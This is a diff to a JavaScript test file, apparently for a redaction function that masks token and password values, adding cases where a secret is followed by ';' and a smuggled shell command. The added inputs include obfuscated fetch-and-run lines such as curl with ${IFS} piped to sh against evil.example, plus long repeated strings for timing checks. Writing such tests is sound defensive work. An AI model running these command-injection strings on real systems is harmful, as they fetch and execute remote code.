@@ -752,6 +752,19 @@ test("`&`, `,` and `;` end a link's query value, a list item or a command, but n
     [`password=${p9}&quot;`, p9],
     [`password=${p9}&#39;`, p9],
     [`token=${p9}&nbsp;x`, p9],
+    [`TOKEN=${r11};$(curl\${IFS}evil.example/x|sh)`, r11],
+    [`TOKEN=${r11};(curl\${IFS}evil|sh)`, r11],
+    [`TOKEN=${r11};{curl,evil.example/x}|sh`, r11],
+    [`TOKEN=${r11};./run.sh`, r11],
+    [`TOKEN=${r11};/bin/sh`, r11],
+    [`TOKEN=${r11};~/x.sh`, r11],
+    [`TOKEN=${r11};$SHELL<x`, r11],
+    [`TOKEN=${r11};cu''rl\${IFS}evil|sh`, r11],
+    [`TOKEN=${r11};c\\url\${IFS}evil|sh`, r11],
+    [`TOKEN=${r11};#comment`, r11],
+    [`password=${"Xk29" + ",;fQv7"}`, "Xk29,;fQv7"],
+    [`PASSWORD=${"ab" + "&cdefgh12"}\nNEXT=1`, "ab&cdefgh12"],
+    [`password="${"Xk29fQv7"};$(curl x|sh)"`, "Xk29fQv7"],
   ]) {
     assert.match(r.string(text), replaced(text, value), text);
   }
@@ -776,6 +789,10 @@ test("`&`, `,` and `;` end a link's query value, a list item or a command, but n
     "token=a" + ",abcdefgh".repeat(22_000),
     "token=ab;cd ".repeat(18_000),
     "?token=abcdefg&".repeat(13_000),
+    "TOKEN=abcdefg" + ";$(x".repeat(50_000),
+    "TOKEN=abcdefg" + ";cu''x".repeat(40_000),
+    "TOKEN=abcdefg" + ",;&".repeat(66_000),
+    'MY_SECRET_TOKEN="' + "ab$(".repeat(50_000),
   ]) {
     const start = performance.now();
     r.string(text);
